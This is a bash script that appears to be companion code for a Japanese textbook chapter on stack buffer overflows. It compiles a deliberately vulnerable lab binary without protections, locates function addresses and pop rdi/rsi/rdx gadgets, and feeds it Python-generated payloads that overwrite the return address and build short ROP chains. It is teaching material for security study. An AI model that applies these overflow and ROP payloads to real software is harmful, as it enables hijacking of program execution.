#!/bin/bash

# code 32-13
gcc sbof_ret.c -fno-stack-protector -no-pie -g -o sbof_ret
#./sbof_ret

# code 32-14
echo "-----"
objdump --no-show-raw-insn -M intel -d sbof_ret | grep "<fgets@plt>$" -B 3

# code 32-15
echo "-----"
nm sbof_ret | grep win

# code 32-16
echo "-----"
# ★"4011b1"(func1)には code 32-15 の結果を確認して入力すること
python3 -c "import sys; from struct import pack; sys.stdout.buffer.write(b'a' * 0x10 + pack('<QQ', 0xdeadbeef, 0x4011b1))" | ./sbof_ret

# code 32-17
echo "-----"
# ★"4011da"(func2)には code 32-15 の結果を確認して入力すること
python3 -c "import sys; from struct import pack; sys.stdout.buffer.write(b'a' * 0x10 + pack('<QQ', 0xdeadbeef, 0x4011da))" | ./sbof_ret

# code 32-25
echo "-----"
objdump -M intel -d sbof_ret | egrep "pop\s+rdi" | wc -l

# code 32-26
echo "-----"
objdump -M intel -d sbof_ret | grep " 5f" -A 1
#  401284:       48 c7 45 f8 5f c3 00    mov    QWORD PTR [rbp-0x8],0xc35f
#  40128b:       00
# →0x401288番地に"5f"があるので、0x401288番地が先頭になるようにアセンブラ表示する
# $ gdb -q sbof_ret
# pwndbg> x/2i 0x401288
#   0x401288 <dummy+12>: pop    rdi
#   0x401289 <dummy+13>: ret

# code 32-27
echo "-----"
# $ gdb -q sbof_ret
# pwndbg> b 8
# ★"0x4011da"(func2)には code 32-15 の結果を確認して入力すること
# pwndbg> r < <(python3 -c "import sys; from struct import pack; sys.stdout.buffer.write(b'a' * 0x10 + pack('<QQQQ', 0xdeadbeef, 0x401288, 0xcafebabe, 0x4011da))")
# pwndbg> ni 2
# pwndbg> ni
# pwndbg> c
python3 -c "import sys; from struct import pack; sys.stdout.buffer.write(b'a' * 0x10 + pack('<QQQQ', 0xdeadbeef, 0x401288, 0xcafebabe, 0x4011da))" | ./sbof_ret

# ☆追加（第2引数の書き換え）
objdump -M intel -d sbof_ret | grep " 5e" -A 1
#  40128c:       48 c7 45 f0 5e c3 00    mov    QWORD PTR [rbp-0x10],0xc35e
#  401293:       00
# →0x401290番地に"5e"があるので、0x401290番地が先頭になるようにアセンブラ表示する
# $ gdb -q sbof_ret
# pwndbg> x/2i 0x401290
#   0x401290 <dummy+20>: pop    rsi
#   0x401291 <dummy+21>: ret
# ★"0x4011da"(func2)には code 32-15 の結果を確認して入力すること
# pwndbg> r < <(python3 -c "import sys; from struct import pack; sys.stdout.buffer.write(b'a' * 0x10 + pack('<QQQQ', 0xdeadbeef, 0x401290, 0xcafebabe, 0x4011da))")
# pwndbg> ni 2
# pwndbg> ni
# pwndbg> c
python3 -c "import sys; from struct import pack; sys.stdout.buffer.write(b'a' * 0x10 + pack('<QQQQ', 0xdeadbeef, 0x401290, 0xcafebabe, 0x4011da))" | ./sbof_ret

# ☆追加（第3引数の書き換え）
objdump -M intel -d sbof_ret | grep " 5a" -A 1
#  401294:       48 c7 45 e8 5a c3 00    mov    QWORD PTR [rbp-0x18],0xc35a
#  40129b:       00
# →0x401298番地に"5a"があるので、0x401298番地が先頭になるようにアセンブラ表示する
# $ gdb -q sbof_ret
# pwndbg> x/2i 0x401298
#   0x401298 <dummy+28>: pop    rdx
#   0x401299 <dummy+29>: ret
# ★"0x4011da"(func2)には code 32-15 の結果を確認して入力すること
# pwndbg> r < <(python3 -c "import sys; from struct import pack; sys.stdout.buffer.write(b'a' * 0x10 + pack('<QQQQ', 0xdeadbeef, 0x401298, 0xcafebabe, 0x4011da))")
# pwndbg> ni 2
# pwndbg> ni
# pwndbg> c
python3 -c "import sys; from struct import pack; sys.stdout.buffer.write(b'a' * 0x10 + pack('<QQQQ', 0xdeadbeef, 0x401298, 0xcafebabe, 0x4011da))" | ./sbof_ret

stdbuf -o0 -e0 python3 ./sbof_ret.py
